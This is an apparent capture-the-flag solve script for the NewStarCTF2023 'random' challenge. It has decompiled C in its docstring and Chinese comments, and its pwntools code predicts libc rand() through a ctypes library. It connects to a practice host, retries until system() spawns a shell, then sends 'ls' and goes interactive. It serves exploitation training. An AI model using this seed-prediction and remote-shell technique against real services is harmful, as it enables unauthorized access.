"""NewStarCTF2023 random
  v8 = rand();
  puts("can you guess the number?");
  __isoc99_scanf("%d", &v6);
  if ( v8 == v6 )
  {
    qmemcpy(v9, "2$031", sizeof(v9));
    v3 = (char)v9[rand() % 5];
    v4 = rand();
    sy((unsigned int)(char)v9[v4 % 2], v3);
  }
  else
  {
    printf("%s", "Haha you are wrong");
  }
random1.so 见 python_ctype_random_gcc_shared.sh
"""
from pwn import *
import ctypes

# context.log_level = 'debug'

tob = lambda text: str(text).encode('utf-8')

# 加载动态链接库
lib = ctypes.CDLL('./random1.so')

# 由于题目是在"2$031"中随机组成system函数的参数，
# 推测当参数为$1或者$2时可以getshell,所以多次尝试
while 1:
   try: # 使用try-except解决有时远程连接出错问题，其实不用也可以
       # sh = process('./pwn') 
       sh = remote("node4.buuoj.cn", 28321)
       # 设置函数返回类型为整数
       lib.random_number.restype = ctypes.c_int
       # 调用C语言的set_seed函数
       lib.set_seed()
       # 调用C语言的random_number函数
       result = lib.random_number()
# 打印日志
       log.success("result==" + hex(result))
       # 发送我们的答案
       sh.recvuntil(b"?\n")
       sh.sendline(tob(result))
       # 试探一下()
       sh.sendline(b'ls')
       answer = sh.recv(timeout = 3)
      
       if b'sh' in answer:  # 排除类似"sh: 1: 23: not found\n"的报错信息
           sh.close()
       elif b'Haha you are wrong' in answer: # 排除某些时候猜错数字，虽然概率较小
           sh.close()
       else: 
           # 剩下的应该就是有回显的getshell情况了
           # sh.sendline(b'cat flag')
           sh.interactive()
   except:
       sh.close()

